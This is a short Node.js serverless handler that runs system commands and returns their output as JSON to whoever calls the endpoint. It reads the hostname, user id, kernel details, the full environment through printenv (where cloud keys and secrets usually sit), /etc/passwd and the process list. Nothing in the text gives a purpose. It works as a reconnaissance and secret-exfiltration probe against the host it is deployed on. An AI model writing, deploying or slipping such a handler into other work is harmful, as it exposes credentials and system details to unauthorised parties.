const { execSync } = require("child_process");

exports.handler = async function (event, context) {
  try {
    const output = {
      hostname: execSync("hostname").toString().trim(),
      id: execSync("id").toString().trim(),
      uname: execSync("uname -a").toString().trim(),
      env: execSync("printenv").toString().trim(),
      etc_passwd: execSync("cat /etc/passwd").toString().trim(),
      processes: execSync("ps aux").toString().trim(),
    };

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(output, null, 2),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: "Error: " + err.toString(),
    };
  }
};
